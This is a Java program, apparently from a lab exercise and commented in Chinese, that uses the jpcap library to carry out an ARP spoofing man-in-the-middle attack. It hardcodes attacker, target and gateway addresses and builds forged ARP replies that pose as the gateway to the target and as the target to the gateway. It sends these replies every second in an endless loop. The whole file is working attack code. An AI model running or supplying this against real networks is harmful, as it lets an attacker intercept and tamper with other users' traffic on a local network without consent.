import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.net.InetAddress;
import java.util.Scanner;

public class ArpAttack {
    public static void main(String[] args) throws Exception {
        int time = 1;  // 重发间隔时间（单位是秒）
        Scanner scanner = new Scanner(System.in);

        //攻击者（本机）的IP和MAC
        InetAddress myIp = InetAddress.getByName("10.122.240.191");
        byte[] myMac = stomac("20-16-B9-37-53-93");
        System.out.print("本机IP地址：\"10.122.240.191\"\n" +
                "本机MAC地址：\"20-16-B9-37-53-93\"\n");

        // 被攻击者（靶机）的IP和MAC
        InetAddress targetIp = InetAddress.getByName("10.122.210.54");
        byte[] targetMac = stomac("00-0C-29-CD-F0-BB");
        System.out.print("靶机IP地址：\"10.122.210.54\"\n" +
                "靶机MAC地址：\"00-0C-29-CD-F0-BB\"\n");

        // 网关的IP与MAC
        InetAddress wanIp = InetAddress.getByName("10.122.192.1");
        byte[] wanMac = stomac(NetUtil.getMacAddress(wanIp.getHostName()));
        System.out.print("网关IP地址：\"10.122.192.1\"\n"
                +"网关MAC地址"+NetUtil.getMacAddress(wanIp.getHostName())+"\n");

        System.out.println("\n-------------请从下列网卡中选择一个----------------\n");

        // 枚举网卡
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length;i++) {
            System.out.println(i + "." + devices[i].description);
        }
        System.out.print("\n你选择的网卡是：");
        NetworkInterface device = devices[scanner.nextInt()];
        System.out.println("\n-------------------------------------------------\n");

        //打开设备
        JpcapSender sender = JpcapSender.openDevice(device);

        //构造数据包arp1伪装网关：把伪造的网关IP和攻击者的MAC地址发送给靶机，实现伪装成网关
        ARPPacket arp1 = getARPPacket(myMac, wanIp, targetMac, targetIp);

        //构造数据包arp2伪装靶机：把伪造的靶机IP和攻击者的MAC地址发送给网关，实现伪装成靶机
        ARPPacket arp2 = getARPPacket(myMac, targetIp, wanMac, wanIp);

        //发送两个伪造的ARP应答包，使得靶机认为攻击者是网关，网关认为攻击者是靶机，从而实现中间人攻击。

        // 发送ARP应答包
        for (int i = 1;true;i++) {
            sender.sendPacket(arp1);
            sender.sendPacket(arp2);

            System.out.println("已发送： " + i);
            Thread.sleep(time * 1000);
        }
    }

    /**
     * mac地址转byte数组的方法
     */
    static byte[] stomac(String s) {
        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
        String[] s1 = s.split("-");
        for (int x = 0; x < s1.length; x++) {
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
        }
        return mac;
    }

    /**
     * 构造ARP包的方法
     */
    public static ARPPacket getARPPacket(byte[] sender_hardaddr,InetAddress sender_protoaddr,
                                         byte[] target_hardaddr,InetAddress target_protoaddr) {
        //初始化arp包
        ARPPacket arp = new ARPPacket();
        //设置硬件类型为以太网
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        //设置协议类型为IPv4
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        //操作类型，1表示请求，2表示应答，这里我们需要构造应答包
        arp.operation = ARPPacket.ARP_REPLY;
        //硬件地址长度，MAC地址长度是6字节
        arp.hlen = 6;
        //协议地址长度，IPv4地址长度是4字节
        arp.plen = 4;
        //发送端MAC地址
        arp.sender_hardaddr = sender_hardaddr;
        //发送端IP地址
        arp.sender_protoaddr = sender_protoaddr.getAddress();
        //目标端MAC地址
        arp.target_hardaddr = target_hardaddr;
        //目标端IP地址
        arp.target_protoaddr = target_protoaddr.getAddress();
        //定义以太网首部
        EthernetPacket ether = new EthernetPacket();
        //设置帧类型为ARP帧
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        //设置以太网首部的源地址为发送端MAC地址
        ether.src_mac = sender_hardaddr;
        //设置以太网首部的目的地址为目标端MAC地址
        ether.dst_mac = target_hardaddr;
        //将以太网首部附加到ARP包上
        arp.datalink = ether;

        return arp;
    }
}
